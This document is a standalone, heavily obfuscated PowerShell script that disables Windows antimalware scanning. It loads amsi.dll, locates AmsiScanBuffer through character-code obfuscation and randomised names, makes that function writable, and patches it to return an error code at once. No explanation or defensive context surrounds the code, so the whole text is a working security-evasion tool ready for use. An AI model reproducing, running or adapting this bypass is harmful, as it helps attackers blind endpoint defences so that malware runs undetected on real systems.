$jZXp = @"
using System;
using System.Runtime.InteropServices;
public class jZXp {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr usHrtYTWHlj8epJ2, string xpsG7LOgjJQO6R);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr Pe8Iodv_ji749r, UIntPtr G7qn9m5uV, uint OBZH, out uint yn9V9N_kL16Sw4Lucg);
}
"@

Add-Type $jZXp

$MFQHIE = [jZXp]::LoadLibrary("$([chaR](39+58)+[chaR](109)+[CHaR]([bYtE]0x73)+[cHAR]([BytE]0x69)+[chAr](46+5-5)+[chAr]([BytE]0x64)+[chAr]([ByTe]0x6c)+[chaR](2+106))")
$_E7YpNu_A = [jZXp]::GetProcAddress($MFQHIE, "$([char](65+12-12)+[ChaR](109*90/90)+[cHAR](115*57/57)+[ChAr]([byTe]0x69)+[CHaR](13+70)+[ChaR](99)+[CHAR]([bytE]0x61)+[CHar]([BYTe]0x6e)+[ChAR]([BYte]0x42)+[chAr](117+46-46)+[CHAR]([BytE]0x66)+[char](50+52)+[ChAr]([BYte]0x65)+[chAR]([bytE]0x72))")
$p = 0
[jZXp]::VirtualProtect($_E7YpNu_A, [uint32]5, 0x40, [ref]$p)
$JLSdL57 = "0xB8"
$iC7kcU4cRLPRkrh = "0x57"
$ZSgRHylO = "0x00"
$DQiFnNYhKY663SRxTD = "0x07"
$AnCVWL1b = "0x80"
$Wka8t = "0xC3"
$gUt8jx8O14RYvp22F3WW = [Byte[]] ($JLSdL57,$iC7kcU4cRLPRkrh,$ZSgRHylO,$DQiFnNYhKY663SRxTD,+$AnCVWL1b,+$Wka8t)
[System.Runtime.InteropServices.Marshal]::Copy($gUt8jx8O14RYvp22F3WW, 0, $_E7YpNu_A, 6)